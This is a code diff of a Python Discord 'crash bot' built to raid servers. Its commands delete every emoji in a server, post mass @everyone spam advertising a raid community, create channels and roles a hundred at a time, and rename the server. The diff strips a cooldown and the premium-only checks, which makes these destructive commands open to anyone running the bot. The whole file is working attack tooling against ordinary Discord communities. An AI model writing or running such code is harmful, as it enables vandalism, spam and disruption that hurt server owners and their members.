@@ -361,18 +361,17 @@ async def spamall(ctx):
             continue
             
 @bot.command()
-@commands.cooldown(1, 140, commands.BucketType.user) 
 async def delemoji(ctx):
 	for emoji in ctx.guild.emojis:
 	 await emoji.delete()
 
-@bot.command(pass_context=True)
+@bot.command()
 async def spam(ctx):
      for s in range(200):
       await ctx.send("@everyone @here \n Ссылка на дискорд сервер с краш ботами https://discord.gg/6SE3CcGQdx ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ботом Lavan-Premium', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `JK Crashers` __представляет:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/6SE3CcGQdx) \n `Telegram канал` [🔗Клик](https://t.me/amoguscommunity) \n `Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))
 
 #Количественные
-@bot.command(pass_context=True)
+@bot.command()
 async def intchannels(ctx, m):
     await ctx.message.delete()
     count1 = 0
@@ -387,7 +386,7 @@ async def intchannels(ctx, m):
         count1 += 1
         await ctx.author.send(embed=embed)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def introles(ctx, m):
     await ctx.message.delete()
     count1 = 0
@@ -404,29 +403,21 @@ async def introles(ctx, m):
 #Кастомные
 @bot.command()
 async def customchan(ctx, *, arg):
-  if not ctx.author.id in premium:
-    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
   await ctx.send("Хорошо")
   for b in range(100):
    await ctx.guild.create_text_channel(arg)
 @bot.command()
 async def customroles(ctx, *, arg):
-  if not ctx.author.id in premium:
-    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
   await ctx.send("Хорошо")
   for b in range(100):
    await ctx.guild.create_role(arg)
 @bot.command()
 async def customchanvoice(ctx, *, arg):
-  if not ctx.author.id in premium:
-    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
   for b in range(100):
    await ctx.guild.create_voice_channel(arg)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def customname(ctx, *, arg):
-  if not ctx.author.id in premium:
-    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
   await ctx.guild.edit(name=arg)
   embed = discord.Embed(
         title = 'Изменил название сервера.',
@@ -435,10 +426,8 @@ async def customname(ctx, *, arg):
     )
   await ctx.author.send(embed=embed)
 
-@bot.command(pass_context=True)
+@bot.command()
 async def customspam(ctx, *, arg):
-  if not ctx.author.id in premium:
-    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не купил премиум -_-', colour = 0xf00a0a))
   for s in range(200):
     await ctx.send(arg)
 
